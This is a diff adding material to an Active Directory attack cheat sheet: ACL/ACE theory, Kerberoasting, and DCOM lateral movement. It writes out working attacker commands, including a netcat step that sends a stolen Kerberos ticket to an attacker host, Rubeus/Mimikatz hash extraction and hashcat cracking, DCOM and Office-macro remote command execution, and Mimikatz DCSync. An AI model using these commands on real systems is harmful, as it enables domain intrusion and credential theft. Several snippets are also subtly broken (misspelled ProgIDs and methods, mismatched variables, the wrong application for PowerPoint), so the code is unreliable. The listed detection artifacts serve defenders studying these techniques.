@@ -981,6 +981,8 @@ You can also change the token type.
 
 ###### *If you don't know, now you know : [Security Descriptor](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors)*
 
+Each object stores a value called a security descriptor(SD), in the **nTSecurityDescriptor** attribute.
+
 Security descriptors define the security attributes of securable objects such as files, registry keys, WMI namespaces, printers, services, or shares.
 
 A security descriptor contains information about the owner and primary group of an object. A provider can compare the resource security descriptor to the identity of a requesting user, and determine whether or not the user has the right to access the resource that a user is requesting.
@@ -988,13 +990,17 @@ A security descriptor contains information about the owner and primary group of 
 A security descriptor can include the following security information:
 
 - Security identifiers (SIDs) for the owner and primary group of an object.
-- A DACL that specifies the access rights allowed or denied to particular users or groups.
-- A SACL that specifies the types of access attempts that generate audit records for the object.
+- A System ACL (SACL) that specifies the types of access attempts that generate audit records for the object.
+- A Discretionary ACL (DACL) that specifies the access rights allowed or denied to particular users or groups.
 - A set of control bits that qualify the meaning of a security descriptor or its individual members.
 
 ![Security Descriptor](security-descriptor.png)
 
 ###### *If you don't know, now you know: [DACLs & ACEs](https://www.windowstechno.com/what-is-ntds-dit/)*
+
+Both System ACL and Discretionary ACL holds a collection of access control entries (ACEs) that correspond to individual audit or permission entries.
+
+Every permission granted in Active Directory is based on these ACE structures.
 
 How it works
 
@@ -1003,12 +1009,32 @@ How it works
 
 All ACEs contain the following access control information:
 
-- A security identifier (SID) that identifies the trustee to which the ACE applies.
-- An access mask that specifies the access rights controlled by the ACE.
-- A flag that indicates the type of ACE.
-- A set of bit flags that determine whether child containers or objects can inherit the ACE from the primary object to which the ACL is attached.
+- **Trustee**: The SID of the user or group to which the ACE applies
+- **ACE Type**: Determines whether the ACE is an allow or a deny.
+- **Object Type**: The *schemaIDGUID* for the attribute or object class that the ACE applies to or the *rightsGuid* for the property set
+- **Inherited Object Type**: The *schemaIDGUID* for the types of object that the ACE applies to when an attribute, property set, or validated right is specified or when the ACE is inherited
+- **Access Mask**: A bit flag that describes the type of access, such as Read, Write, List, Create, Delete,
+Control Access, etc.
+- **Flags**: There are actually two different fields for flags. The flags specify inheritance settings such as ACE is inherited, ACE is allowed to be inherited, ACE is not inheritable, etc
 
 Access Control Entries describe the allowed and denied permissions for other principals in Active Directory against the securable object.
+
+Microsoft has introduced several new “tools” that are not present in the NTFS ACLs
+
+These tools are called property sets, validated writes, and extended rights. Instead of inserting the *schemaIDGUID* into the Object Type field of an ACE, you can insert the *rightsGuid* attribute of the property set, validated write, or extended right object. These objects are all stored in the *cn=extended-rights* subcontainer of the Configuration container.
+
+- Inherited Versus Explicit Permissions
+
+- **Explicit permissions** are permissions that are directly applied to an object
+- **Inherited permissions** are permissions that are applied at some level of the tree above the object and "flow down" to the object and its children.
+
+The rules for what access will result from a set of inherited and explicit ACEs are easiest to understand when taken in steps:
+
+1. Deny ACEs override grant ACEs of the same type (inherited versus explicit) and application point in the directory tree.
+2. Explicit ACEs override inherited ACEs.
+3. Inherited ACEs are hierarchical (e.g., an inherited deny applied to a container will be overridden by an inherited grant applied to containers nested below it in the same tree).
+
+Most simply, the closest ACEs to an object will dictate the access for that object.
 
 Some of the Active Directory object permissions and types that we as attackers are interested in:
 
@@ -1465,6 +1491,18 @@ The ALL collection method will perform **a lot of queries**, which could trigger
 2) We can use bloodhound
 
 When we put those four files within Bloundhount, we can search for nodes (Active Directory Object)
+
+##### Abusing Active Directory ACLs/ACEs
+
+```powershell
+# GenericAll on User
+Get-DomainObjectAcl -Identity USER -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
+# GenericAll on Group
+# -> net group "USER GROUP" USER /add /domain
+# GenericAll / GenericWrite / Write on Computer
+# WriteProperty on Group
+
+```
 
 ###### *If you don't know, now you know: [Active Directory Accounts](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts)*
 
@@ -2101,9 +2139,94 @@ For more information about that technique refer to [T1558.003 - Steal or Forge K
 
 Kerberoasting stand for extracting service account credential hashes from Active Directory for offline cracking.
 
+```bash
+tgsrepcrack.py pwd kerberoast.bin
+```
+
 Note that a SIEM or Security Analysts may detect the fact that we are requesting an RC4 instead of AES.
 
 For more information about that technique refer to [T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)
+
+#### Kerberoasting
+
+> // To Finish
+
+:warning: Requirement:
+
+- User Account
+
+Kerberoasting is a common, pervasive attack targeting Active Directory service account credentials that exploits a combination of weak encryption and poor service account password hygiene.
+
+Kerberoasting takes advantage of human nature nearly as much as it exploits known security weaknesses in Kerberos authentication for Active Directory.
+
+request a Kerberos service ticket for any service, capture that ticket granting service (TGS) ticket from memory,
+
+By design, TGS tickets are encrypted with the **service account's NTLM hash**. In Microsoft Windows, service principal names (SPNs) identify service accounts that are used to encrypt TGS tickets. They can be linked to either host- or domain user accounts.
+Kerberos authentication allows authenticated domain users to request a TGS ticket for any service on the network.
+
+Kerberoasting attacks work only against domain user SPNs. That is because **host-based SPNs** are secured with random 128-character passwords that are changed every 30 days. These long, random, and short lived passwords are practically unguessable, even with modern password cracking tools and hardware.
+On the otherside, **user account SPN passwords** which may never expire and may be changed rarely.
+
+Here are two methods to enumerate vulnerable SPN:
+
+- PowerSploit [Get-NetUser]() cmdlet
+- Script from [Stealthbits](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)
+
+```powershell
+# Build LDAP Filter to look for users with SPN values registered for current domain
+$ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
+$domain = New-Object System.DirectoryServices.DirectoryEntry
+$search = New-Object System.DirectoryServices.DirectorySearcher
+$search.SearchRoot = $domain
+$search.PageSize = 1000
+$search.Filter = $ldapFilter
+$search.SearchScope = "Subtree"
+#Execute Search
+$results = $search.FindAll()
+#Display SPN values from the returned objects
+$Results = foreach ($result in $results)
+{
+  $result_entry = $result.GetDirectoryEntry()
+ 
+  $result_entry | Select-Object @{
+    Name = "Username";  Expression = { $_.sAMAccountName }
+  }, @{
+    Name = "SPN"; Expression = { $_.servicePrincipalName | Select-Object -First 1 }
+  }
+}
+ 
+$Results
+```
+
+```powershell
+# 1. On our workstation: Setting up a nc listener in order to receive the hash we will crack later
+nc -lvp 443 > kerberoast.bin
+# 2. On our compromised PC: Enumerating user accounts with 'serverPrincipalName' attribute set
+Get-NetUser -SPN # Using PowerSploit
+Get-ADObject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
+
+
+
+
+Add-Type -AssemblyName System.IdentityModel  
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
+
+
+nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
+
+```
+
+Extract the hash from memory
+
+```bash
+# Through Rubeus
+.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
+# Through Mimikatz
+mimikatz # kerberos::list /export
+```
+
+.\hashcat.exe -m 13100 -o cracked.txt -a 0 .\Hash.txt .\wordlist.txt
+
 
 #### Golden Ticket
 
@@ -2196,22 +2319,230 @@ These properties include:
 - **msDS-ManagedPasswordId**: This constructed attribute contains the key identifier for the current managed password data for a group MSA.
 - **msDS-ManagedPasswordInterval**: This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
 
-```bash
+```powershell
 $gmsa = Get-ADServiceAccount -Identity 'IDENTITY' -Properties 'msDS-ManagedPassword'
 $mp = $gmsa.'msDS-ManagedPassword'
 ConvertFrom-ADManagedPasswordBlob $mp
 ```
 
-#### SID History (Multi Domain)
+##### Lateral Movement with DCOM
 
-SID History enables access for another account to effectively be cloned to another.
-It could enable us to escalate from one Active Directory Domain to another within the same forest.
-This means that if we are administrator of another trusted domain, we can try to add an administrator account SID of the trusting domain to the SIDHistory attribute of a user account in the trusted domain.
+By using this DCOM application and the associated method, it is possible to pivot to a remote host without using psexec, WMI, or other well-known techniques.
+
+- **MMC20.Application** *(49b2791a-b1ae-4c90-9b8e-e860ba07f889)*:
+- **WScript.Shell** *(72c24dd5-d70a-438b-8a42-98424b88afb8/f935dc22-1cf0-11d0-adb9-00c04fd58a0b)*:
+- **ShellWindows** *(9BA05972-F6A8-11CF-A442-00A0C90A8F39)*: Represents a collection of the open windows that belong to the Shell. Methods associated with this objects can control and execute commands within the Shell, and obtain other Shell-related objects.
+- **ShellBrowserWindow** *(C08AFD90-F2A1-11D1-8455-00A0C91F3880)*: Creates a new instance of Windows Explorer
+- **Shell.Application**: *(13709620-c279-11ce-a49e-444553540000)*
+- ...
+
+DCOM applications can access the network and execute commands.
+
+Here below is a the command to get a list of DCOM application
+
+```powershell
+Get-CimInstance Win32_DCOMApplication
+```
+
+###### Arbitrary Command Line Execution through Excell DDE
+
+This uses the recently infamous Direct Data Exchange inter-process communications of Excel to execute an arbitrary command line.
+
+To perform this technique, first create an instance of the "Excel.Application" object, which is the COM object associated with Excel automation.
+
+```powershell
+$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excell.Application","TARGET_IP"))
+# Tells Microsoft Excel to not display certain alerts and messages while a macro is running.
+$excel.DisplayAlerts = $false
+# Opens a dynamic data exchange (DDE) channel to another application.
+$excel.DDEInitiate("cmd","/c PAYLOAD")
+```
+
+:warning: Artifacts and Indicators:
+
+- The executed command is run as a child process of Excel.
+
+###### Arbitrary Command Line Execution through MMC20.Application
+
+The **ExecuteShellCommand** method of ActiveView runs a command in a window. After this method successfully starts the command in a separate process, it returns immediately (it does not wait for the command to complete).
+
+```vb
+View.ExecuteShellCommand( _
+  ByVal Command As String, _     ' A value that specifies the command to execute. 
+  ByVal Directory As String, _   ' A value that specifies the name of the working directory.
+  ByVal Parameters As String, _  ' A value that specifies parameters, if any, to be used by Command
+  ByVal WindowState As String _  ' A value that specifies the state for the window.
+)
+```
+
+Here is how we can proceed
+
+```powershell
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET_IP"))
+$mmc.Document.ActiveView.ExecuteShellCommand("PAYLOAD", $null, $null, "7")
+```
+
+:warning: Artifacts and Indicators:
+
+- The executed command is run as a child process of mmc.exe.
+
+###### Arbitrary Command Line Execution through ShellWindows
+
+```powershell
+$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET_IP"))
+$shell[0].Document.Application.ShellExecute("PAYLOAD")
+```
+
+:warning: Artifacts and Indicators:
+
+- ShellWindows does not create a process. Instead, it activates the class instance inside of an existing explorer.exe process, which executes child processes quite regularly.
+- To communicate, the host explorer.exe opens a listening socket on a DCOM port, which should clearly flag this technique.
+&rarr; An explorer.exe process with a listening socket should raise your suspicion regardless of this method.
+
+###### Arbitrary Command Line Execution through ShellBrowserWindow
+
+```powershell
+$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET_IP"))
+$shell.Document.Application.ShellExecute("PAYLOAD")
+```
+
+:warning: Artifacts and Indicators:
+
+- ShellBrowserWindow does not create a process. Instead, it activates the class instance inside of an existing explorer.exe process, which executes child processes quite regularly.
+- To communicate, the host explorer.exe opens a listening socket on a DCOM port, which should clearly flag this technique.
+&rarr; An explorer.exe process with a listening socket should raise your suspicion regardless of this method.
+
+###### Arbitrary Command Line Execution through Outlook
+
+The Outlook object allows the instantiation and interaction with arbitrary COM objects via the **CreateObject** method.
+
+```powershell
+$outlook = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","TARGET_IP"))
+$shell = $outlook.CreateObject("Shell.Application")
+$shell.ShellExecute("calc.exe")
+```
+
+:warning: Artifacts and Indicators:
+
+- The command is run as a direct child process of Outlook.
+
+###### Arbitrary Command Line Execution through Visio's ExecuteLine
+
+The Visio object provides a direct method to run any line of VBA from a string with the "ExecuteLine" method.
+
+- ExecuteLine : Executes a line of Microsoft Visual Basic code.
+
+```powershell
+$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp"))
+$doc = $visio.Documents.Add("")
+$doc.ExecuteLine('CreateObject("Wscript.Shell").Exec("PAYLOAD")')
+```
+
+:warning: Artifacts and Indicators:
+
+- VBE7.dll and ScrRun.dll are loaded into the Visio process.
+
+###### Arbitrary Command Line Execution through Office Macro
+
+The VBA Engine model in Office is normally inaccesible programmaticaly and needs to be enabled through the "Trust Access to Visual Basic Project" option in the properties menu of every application.
+This can also be done via the *HKCU\Software\Microsoft\Office\\\<office version>\\\<office application name>\Security\accessVBOM*
+
+Setting these values to 1 remotely (via WMI, for example) allows for the injection and execution of VBA macros into Excel, Word, PowerPoint and Access without supplying a payload carrying document file first.
+
+Here below is a macro
+
+```powershell
+$macro : 'Sub Execute()
+CreateObject("Wscript.Shell").Exec("calc.exe")
+End Sub
+
+Sub AutoOpen()
+Execute
+End Sub'
+```
+
+Through Excell
+
+```powershell
+$excel = [activator]::CreateInsstance([type]::GetTypeFromProgID("Excel.Application"))
+$wb = $excel.Workbooks.Add("")
+$wb.VBProject.VBComponents(1).CodeModule.AddFromString($macro)
+$excel.Run("Book1!ThisWorkbook.Execute")
+$excel.Quit()
+```
+
+Through Word
+
+```powershell
+$word = [activator]::CreateInsstance([type]::GetTypeFromProgID("Word.Application"))
+$doc = $word.Documents.Add("")
+$doc.VBProject.VBComponents(1).CodeModule.AddFormatString($macro)
+$doc.RunAutoMacro(2)
+$word.Quit()
+```
+
+Through PowerPoint
+
+```powershell
+$ppt = [activator]::CreateInsstance([type]::GetTypeFromProgID("Word.Application"))
+$pres = $ppt.Presentations.Add(1)
+$vbc.CodeModule.AddFromString($macro)
+$ppt.Run("Execute")
+$ppt.Quit()
+```
+
+Through Access
+
+```powershell
+$access = [activator]::CreateInstance([type]::GetTypeFromProgID("Access.Application"))
+$db = $access.NewCurrentDatabase("fake_name")
+$vbc = $access.vbe.VBProjects(1).VBComponents.Add(1)
+$vbc.CodeModule.AddFromString($macro)
+$access.Run("Execute")
+$access.Quit()
+```
+
+:warning: Artifacts and Indicators:
+
+- Enabling these methods requires the manipulation of certain registry keys that are rarely touched remotely, and are occasionally used by malicious macros.
+
+###### Arbitrary Library Load through Excel XLL Registration
+
+Excel is extensible by XLL libraries, which are simply DLLs that export specific functions. The Excel.Application object exposes this functionality via the RegisterXLL method.
+
+```powershell
+$excell = [activator]::CreateInstance([type]::GetTypeFromProgID("Excell.Application"))
+$excell.RegisterXLL("DLL")
+```
+
+:warning: Artifacts and Indicators:
+
+- The Excel process loads an unknown DLL.
+
+
+###### *If you don't know, now you know : [COM/DCOM](https://docs.microsoft.com/en-us/windows/win32/com/the-component-object-model)*
+
+The Microsoft Component Object Model (COM) is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents), ActiveX (Internet-enabled components), as well as others.
+
+A COM object's services can be consumed from almost any language by multiple processes, or even **remotely**.
+COM objects are usually obtained by specifying either:
+
+- **CLSID*: The *Class Identifier* is a *GUID*, which acts as a unique identifier for a COM class, and every class registered in Windows is associated with a CLSID (COM objects may be used without registration, but that is beyond the scope of this article). The CLSID key in the registry points to the implementation of the class, using the *InProcServer32* subkey in case of a dll-based object, and the LocalServer32 key in case of an exe.
+
+- **ProgID*: The *Programmatic Identifier* is an optional identifier, which can be used as a more user-friendly alternative to a CLSID, as it does not have to adhere to the intimidating GUID format of CLSIDs ("System.AppDomainManager", for example, is much easier on the eyes than a GUID). ProgIDs are not guaranteed to be unique, and unlike CLSID, not every class is associated with a ProgID.
+
+These COM objects are published in the Windows registry and can be extracted easily.
+
+#### SID History (Multi Domain)
 
 Requirements:
 
 - We need to have domain administrator privileges in the trusted domain in order to exploit the vulnerability.
 - The domain we are on need to be trusted by the target domain.
+
+SID History enables access for another account to effectively be cloned to another.
+It could enable us to escalate from one Active Directory Domain to another within the same forest.
+This means that if we are administrator of another trusted domain, we can try to add an administrator account SID of the trusting domain to the SIDHistory attribute of a user account in the trusted domain.
 
 ```bash
 Get-ADUser -Identity USER -Properties SidHistory | Select-Object -ExpandProperty SIDHistory
@@ -2253,7 +2584,7 @@ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System' -PrincipalIdent
 
 We can DCSync any account we want from the Domain Controller, even being not Domain Admin.
 
-```
+```bash
 mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt /domain:DOMAIN
 ```
 
@@ -2347,6 +2678,7 @@ This vulnerability allows an attacker to abuse Windows system services to conduc
 - For the "Task Scheduler" part, thanks to itm4n <https://itm4n.github.io/localservice-privileges/>
 - For the "Windows Subsystem for Linux" part, thanks to <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl>
 - For the "DACLs & ACEs" part, thanks to ired.team <https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces>
+- For the "COM/DCOM" part, thanks to CyberReason <https://www.cybereason.com/blog/dcom-lateral-movement-techniques>
 
 #### Source Todo
 
